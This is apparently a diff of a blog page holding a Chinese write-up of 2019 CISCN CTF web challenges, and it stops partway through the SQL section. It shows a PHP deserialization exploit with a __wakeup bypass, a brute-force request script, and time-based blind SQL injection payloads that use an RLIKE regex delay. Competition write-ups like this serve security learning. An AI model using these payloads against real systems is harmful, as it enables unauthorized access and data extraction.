@@ -1,603 +1,332 @@
-<!doctype html><html lang=en-us>
-<head><meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<link rel=manifest href=/manifest.json><meta name=description content="国赛 Web wp
-"><title>2019 CISCN Web wp</title>
-<link rel=canonical href=https://blog.zeddyu.info/2019/05/06/2019ciscn/>
-<link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="2019 CISCN Web wp">
-<meta property="og:description" content="国赛 Web wp
-">
-<meta property="og:url" content="https://blog.zeddyu.info/2019/05/06/2019ciscn/">
-<meta property="og:site_name" content="Zeddy's Blog">
-<meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:tag" content="wp"><meta property="article:published_time" content="2019-05-06T09:23:55+00:00"><meta property="article:modified_time" content="2019-05-06T09:23:55+00:00">
-<meta name=twitter:site content="@ZeddYu_Lu">
-<meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="2019 CISCN Web wp">
-<meta name=twitter:description content="国赛 Web wp
-">
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-PDESKL57LT"></script>
-<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-PDESKL57LT',{anonymize_ip:!1})}</script>
-</head>
-<body class="article-page has-toc">
-<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
-<div class="container main-container flex
-extended">
-<div id=article-toolbar>
-<a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
-<span>Back</span>
-</a>
-</div>
-<main class="main full-width">
-<article class=main-article>
-<header class=article-header>
-<div class=article-details>
-<header class=article-category>
-<a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>
-CTF
-</a>
-</header>
-<h2 class=article-title>
-<a href=/2019/05/06/2019ciscn/>2019 CISCN Web wp</a>
-</h2>
-<footer class=article-time>
-<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
-<time class=article-time--published>May 06, 2019</time>
-</div>
-<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
-<time class=article-time--reading>
-9 minute read
-</time>
-</div>
-</footer>
-</div>
-</header>
-<section class=article-content>
-<p>国赛 Web wp</p>
-<h1 id=day-1>Day 1</h1>
-<h2 id=web>Web</h2>
-<h3 id=justsoso>JustSoso</h3>
-<p>Index.php</p>
-<pre tabindex=0><code class=language-php+html data-lang=php+html>&lt;html&gt;
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=manifest href=/manifest.json><meta name=description content="国赛 Web wp
+"><title>2019 CISCN Web wp</title><link rel=canonical href=https://blog.zeddyu.info/2019/05/06/2019ciscn/><link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="2019 CISCN Web wp"><meta property="og:description" content="国赛 Web wp
+"><meta property="og:url" content="https://blog.zeddyu.info/2019/05/06/2019ciscn/"><meta property="og:site_name" content="Zeddy's Blog"><meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:tag" content="wp"><meta property="article:published_time" content="2019-05-06T09:23:55+00:00"><meta property="article:modified_time" content="2019-05-06T09:23:55+00:00"><meta name=twitter:site content="@ZeddYu_Lu"><meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="2019 CISCN Web wp"><meta name=twitter:description content="国赛 Web wp
+"><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDESKL57LT"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDESKL57LT",{anonymize_ip:!1})}</script></head><body class="article-page has-toc"><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex
+extended"><div id=article-toolbar><a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg><span>Back</span></a></div><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>CTF</a></header><h2 class=article-title><a href=/2019/05/06/2019ciscn/>2019 CISCN Web wp</a></h2><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>May 06, 2019</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>9 minute read</time></div></footer></div></header><section class=article-content><p>国赛 Web wp</p><h1 id=day-1>Day 1</h1><h2 id=web>Web</h2><h3 id=justsoso>JustSoso</h3><p>Index.php</p><pre tabindex=0><code class=language-php+html data-lang=php+html>&lt;html&gt;
 &lt;?php
 error_reporting(0); 
-$file = $_GET[&quot;file&quot;]; 
-$payload = $_GET[&quot;payload&quot;];
+$file = $_GET[&#34;file&#34;]; 
+$payload = $_GET[&#34;payload&#34;];
 if(!isset($file)){
-	echo 'Missing parameter'.'&lt;br&gt;';
+	echo &#39;Missing parameter&#39;.&#39;&lt;br&gt;&#39;;
 }
-if(preg_match(&quot;/flag/&quot;,$file)){
-	die('hack attacked!!!');
+if(preg_match(&#34;/flag/&#34;,$file)){
+	die(&#39;hack attacked!!!&#39;);
 }
 @include($file);
 if(isset($payload)){  
-    $url = parse_url($_SERVER['REQUEST_URI']);
-    parse_str($url['query'],$query);
+    $url = parse_url($_SERVER[&#39;REQUEST_URI&#39;]);
+    parse_str($url[&#39;query&#39;],$query);
     foreach($query as $value){
-        if (preg_match(&quot;/flag/&quot;,$value)) { 
-    	    die('stop hacking!');
+        if (preg_match(&#34;/flag/&#34;,$value)) { 
+    	    die(&#39;stop hacking!&#39;);
     	    exit();
         }
     }
     $payload = unserialize($payload);
 }else{ 
-   echo &quot;Missing parameters&quot;; 
+   echo &#34;Missing parameters&#34;; 
 } 
 ?&gt;
 &lt;!--Please test index.php?file=xxx.php --&gt;
 &lt;!--Please get the source of hint.php--&gt;
 &lt;/html&gt;
-</code></pre><p>Hint.php</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
-<span class=k>class</span> <span class=nc>Handle</span><span class=p>{</span> 
-    <span class=k>private</span> <span class=nv>$handle</span><span class=p>;</span>  
-    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
-		<span class=k>foreach</span><span class=p>(</span><span class=nx>get_object_vars</span><span class=p>(</span><span class=nv>$this</span><span class=p>)</span> <span class=k>as</span> <span class=nv>$k</span> <span class=o>=&gt;</span> <span class=nv>$v</span><span class=p>)</span> <span class=p>{</span>
-            <span class=nv>$this</span><span class=o>-&gt;</span><span class=nv>$k</span> <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
-        <span class=p>}</span>
-        <span class=k>echo</span> <span class=s2>&#34;Waking up</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
-    <span class=p>}</span>
-	<span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$handle</span><span class=p>)</span> <span class=p>{</span> 
-        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>handle</span> <span class=o>=</span> <span class=nv>$handle</span><span class=p>;</span> 
-    <span class=p>}</span> 
-	<span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
-		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>handle</span><span class=o>-&gt;</span><span class=na>getFlag</span><span class=p>();</span>
-	<span class=p>}</span>
-<span class=p>}</span>
-
-<span class=k>class</span> <span class=nc>Flag</span><span class=p>{</span>
-    <span class=k>public</span> <span class=nv>$file</span><span class=p>;</span>
-    <span class=k>public</span> <span class=nv>$token</span><span class=p>;</span>
-    <span class=k>public</span> <span class=nv>$token_flag</span><span class=p>;</span>
- 
-    <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$file</span><span class=p>){</span>
-		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file</span> <span class=o>=</span> <span class=nv>$file</span><span class=p>;</span>
-		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>token_flag</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>token</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nx>rand</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>10000</span><span class=p>));</span>
-    <span class=p>}</span>
-    
-	<span class=k>public</span> <span class=k>function</span> <span class=nf>getFlag</span><span class=p>(){</span>
-		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>token_flag</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nx>rand</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>10000</span><span class=p>));</span>
-        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>token</span> <span class=o>===</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>token_flag</span><span class=p>)</span>
-		<span class=p>{</span>
-			<span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>)){</span>
-				<span class=k>echo</span> <span class=o>@</span><span class=nx>highlight_file</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>,</span><span class=k>true</span><span class=p>);</span> 
-            <span class=p>}</span>  
-        <span class=p>}</span>
-    <span class=p>}</span>
-<span class=p>}</span>
-<span class=cp>?&gt;</span><span class=err>
-</span></code></pre></div><p>从<a class=link href=https://paper.seebug.org/39/ target=_blank rel=noopener>SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a>了解到可以把以下 payload</p>
-<pre tabindex=0><code>O:6:&quot;Handle&quot;:1:
+</code></pre><p>Hint.php</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>  
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Handle</span><span class=p>{</span> 
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$handle</span><span class=p>;</span>  
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>		<span class=k>foreach</span><span class=p>(</span><span class=nx>get_object_vars</span><span class=p>(</span><span class=nv>$this</span><span class=p>)</span> <span class=k>as</span> <span class=nv>$k</span> <span class=o>=&gt;</span> <span class=nv>$v</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=nv>$k</span> <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;Waking up</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$handle</span><span class=p>)</span> <span class=p>{</span> 
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>handle</span> <span class=o>=</span> <span class=nv>$handle</span><span class=p>;</span> 
+</span></span><span class=line><span class=cl>    <span class=p>}</span> 
+</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>handle</span><span class=o>-&gt;</span><span class=na>getFlag</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Flag</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$file</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$token</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$token_flag</span><span class=p>;</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$file</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file</span> <span class=o>=</span> <span class=nv>$file</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>token_flag</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>token</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nx>rand</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>10000</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=k>function</span> <span class=nf>getFlag</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>token_flag</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nx>rand</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>10000</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>token</span> <span class=o>===</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>token_flag</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>				<span class=k>echo</span> <span class=o>@</span><span class=nx>highlight_file</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>,</span><span class=k>true</span><span class=p>);</span> 
+</span></span><span class=line><span class=cl>            <span class=p>}</span>  
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></div><p>从<a class=link href=https://paper.seebug.org/39/ target=_blank rel=noopener>SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a>了解到可以把以下 payload</p><pre tabindex=0><code>O:6:&#34;Handle&#34;:1:
 </code></pre><p>中的 1 改成比 1 大的数可以在反序列化时绕过<code>_warkeup</code>魔术方法
-绕过<code>$this->token === $this->token_flag</code>的判断可以直接通过爆破来绕过</p>
-<p>贴一下脚本：</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>requests</span>
-<span class=kn>import</span> <span class=nn>time</span>
-
-<span class=n>url</span> <span class=o>=</span><span class=s2>&#34;http://e281a336df8b4ea1b7665704aca7b30246d3cd0663434603.changame.ichunqiu.com///?file=hint.php&amp;payload=O%3A6%3A%22Handle</span><span class=si>%22%</span><span class=s2>3A3%3A{s%3A14%3A</span><span class=si>%22%</span><span class=s2>00Handle</span><span class=si>%00ha</span><span class=s2>ndle</span><span class=si>%22%</span><span class=s2>3BO%3A4%3A</span><span class=si>%22F</span><span class=s2>lag</span><span class=si>%22%</span><span class=s2>3A3%3A{s%3A4%3A</span><span class=si>%22f</span><span class=s2>ile</span><span class=si>%22%</span><span class=s2>3Bs%3A10%3A%22.</span><span class=si>%2F</span><span class=s2>flag.php</span><span class=si>%22%</span><span class=s2>3Bs%3A5%3A%22token</span><span class=si>%22%</span><span class=s2>3Bs%3A32%3A%227b670d553471ad0fd7491c75bad587ff</span><span class=si>%22%</span><span class=s2>3Bs%3A10%3A%22token_flag</span><span class=si>%22%</span><span class=s2>3Bs%3A32%3A%227b670d553471ad0fd7491c75bad587ff</span><span class=si>%22%</span><span class=s2>3B}}&#34;</span>
-
-<span class=n>proxies</span> <span class=o>=</span><span class=p>{</span>
-    <span class=s1>&#39;http&#39;</span><span class=p>:</span><span class=s1>&#39;http://127.0.0.1:8080/&#39;</span>
-<span class=p>}</span>
-
-<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>1000000</span><span class=p>):</span>
-    
-    <span class=n>rep</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
-    <span class=k>if</span> <span class=n>rep</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
-        <span class=k>if</span> <span class=s1>&#39;flag&#39;</span> <span class=ow>in</span> <span class=n>rep</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
-            <span class=nb>print</span><span class=p>(</span><span class=n>rep</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
-    <span class=k>else</span><span class=p>:</span>
-        <span class=nb>print</span><span class=p>(</span><span class=n>rep</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
-    <span class=n>i</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
-    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-
-<span class=c1># rep = requests.get(url)</span>
-<span class=c1># print(rep.status_code)</span>
-</code></pre></div><p>这里预期解应该是引用，利用<code>$this->token_flag = &$this->token</code>，这样来绕过</p>
-<h3 id=全宇宙最简单的sql>全宇宙最简单的SQL</h3>
-<p>页面会返回两种错误，一种是登录失败，一种是数据库查询失败</p>
-<p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004508.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004508.jpg loading=lazy>
-</a>
-</figure></p>
-<p>所以我们可以通过利用<code>admin'</code>等操作来 fuzz 闭合方式，得到可以使用单引号闭合。但是通过万能密码可以发现一些关键字被替换了</p>
-<p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006144.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006144.jpg loading=lazy>
-</a>
-</figure></p>
-<p>通过一些简单的 fuzz 可以发现有以下关键字被过滤了</p>
-<pre tabindex=0><code>or || if field elt 
-</code></pre><p>布尔盲注没有可以区分的页面回显，所以这里不能用布尔盲注，报错注入也不行。所以基本确定只能用时间盲注。</p>
-<p>结果发现<code>sleep()</code>、<code>benchmark()</code>等函数均被过滤了，只能寻找一些新的延时注入的方法，在<a class=link href=https://mochazz.github.io/2018/07/28/mysql%E7%9B%B2%E6%B3%A8%E5%A4%87%E5%BF%98%E5%BD%95/ target=_blank rel=noopener>mysql盲注备忘录</a>中发现新的注入方式</p>
-<pre tabindex=0><code>MariaDB [(none)]&gt; select rpad('a',2000000,'a') RLIKE concat(repeat('(a.*)+',30),'b');
+绕过<code>$this->token === $this->token_flag</code>的判断可以直接通过爆破来绕过</p><p>贴一下脚本：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span><span class=s2>&#34;http://e281a336df8b4ea1b7665704aca7b30246d3cd0663434603.changame.ichunqiu.com///?file=hint.php&amp;payload=O%3A6%3A%22Handle</span><span class=si>%22%</span><span class=s2>3A3%3A{s%3A14%3A</span><span class=si>%22%</span><span class=s2>00Handle</span><span class=si>%00ha</span><span class=s2>ndle</span><span class=si>%22%</span><span class=s2>3BO%3A4%3A</span><span class=si>%22F</span><span class=s2>lag</span><span class=si>%22%</span><span class=s2>3A3%3A{s%3A4%3A</span><span class=si>%22f</span><span class=s2>ile</span><span class=si>%22%</span><span class=s2>3Bs%3A10%3A%22.</span><span class=si>%2F</span><span class=s2>flag.php</span><span class=si>%22%</span><span class=s2>3Bs%3A5%3A%22token</span><span class=si>%22%</span><span class=s2>3Bs%3A32%3A%227b670d553471ad0fd7491c75bad587ff</span><span class=si>%22%</span><span class=s2>3Bs%3A10%3A%22token_flag</span><span class=si>%22%</span><span class=s2>3Bs%3A32%3A%227b670d553471ad0fd7491c75bad587ff</span><span class=si>%22%</span><span class=s2>3B}}&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>proxies</span> <span class=o>=</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;http&#39;</span><span class=p>:</span><span class=s1>&#39;http://127.0.0.1:8080/&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>1000000</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=n>rep</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>rep</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s1>&#39;flag&#39;</span> <span class=ow>in</span> <span class=n>rep</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>rep</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>rep</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># rep = requests.get(url)</span>
+</span></span><span class=line><span class=cl><span class=c1># print(rep.status_code)</span>
+</span></span></code></pre></div><p>这里预期解应该是引用，利用<code>$this->token_flag = &$this->token</code>，这样来绕过</p><h3 id=全宇宙最简单的sql>全宇宙最简单的SQL</h3><p>页面会返回两种错误，一种是登录失败，一种是数据库查询失败</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004508.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004508.jpg loading=lazy></a></figure></p><p>所以我们可以通过利用<code>admin'</code>等操作来 fuzz 闭合方式，得到可以使用单引号闭合。但是通过万能密码可以发现一些关键字被替换了</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006144.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006144.jpg loading=lazy></a></figure></p><p>通过一些简单的 fuzz 可以发现有以下关键字被过滤了</p><pre tabindex=0><code>or || if field elt 
+</code></pre><p>布尔盲注没有可以区分的页面回显，所以这里不能用布尔盲注，报错注入也不行。所以基本确定只能用时间盲注。</p><p>结果发现<code>sleep()</code>、<code>benchmark()</code>等函数均被过滤了，只能寻找一些新的延时注入的方法，在<a class=link href=https://mochazz.github.io/2018/07/28/mysql%E7%9B%B2%E6%B3%A8%E5%A4%87%E5%BF%98%E5%BD%95/ target=_blank rel=noopener>mysql盲注备忘录</a>中发现新的注入方式</p><pre tabindex=0><code>MariaDB [(none)]&gt; select rpad(&#39;a&#39;,2000000,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);
 +-------------------------------------------------------------+
-| rpad('a',2000000,'a') RLIKE concat(repeat('(a.*)+',30),'b') |
+| rpad(&#39;a&#39;,2000000,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;) |
 +-------------------------------------------------------------+
 |                                                           0 |
 +-------------------------------------------------------------+
 1 row in set, 1 warning (0.149 sec)
-</code></pre><p>虽然本地没很明显延时，但是打服务器发生了明显的延时。所以接下来就是利用这个点进行时间盲注了。而<code>if</code>又被过滤了，我们就只能通过以下方式去触发延时</p>
-<pre tabindex=0><code>admin'  and (SELECT length(database()) limit 0,1) = 3 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#
-</code></pre><p>数据库长度为3</p>
-<pre tabindex=0><code>admin' and substr((SELECT database() limit 0,1),1,1) = 'c' and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#
+</code></pre><p>虽然本地没很明显延时，但是打服务器发生了明显的延时。所以接下来就是利用这个点进行时间盲注了。而<code>if</code>又被过滤了，我们就只能通过以下方式去触发延时</p><pre tabindex=0><code>admin&#39;  and (SELECT length(database()) limit 0,1) = 3 and rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);#
+</code></pre><p>数据库长度为3</p><pre tabindex=0><code>admin&#39; and substr((SELECT database() limit 0,1),1,1) = &#39;c&#39; and rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);#
 
-admin' and substr((SELECT database() limit 0,1),2,1) = 't' and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#
+admin&#39; and substr((SELECT database() limit 0,1),2,1) = &#39;t&#39; and rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);#
 
-admin' and substr((SELECT database() limit 0,1),3,1) = 'f' and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#
-</code></pre><p>数据库名字为 ctf</p>
-<p>但是如果要接下去拿表名的话传统方法只能去利用<code>information_schema</code>，但是<code>or</code>又被过滤了，而<code>information_schema</code>中又含有<code>or</code>，所以肯定不能行。</p>
-<p>过滤了<code>information_schema</code>基本上没什么替代方式了。所以我们这里只能另辟蹊径。</p>
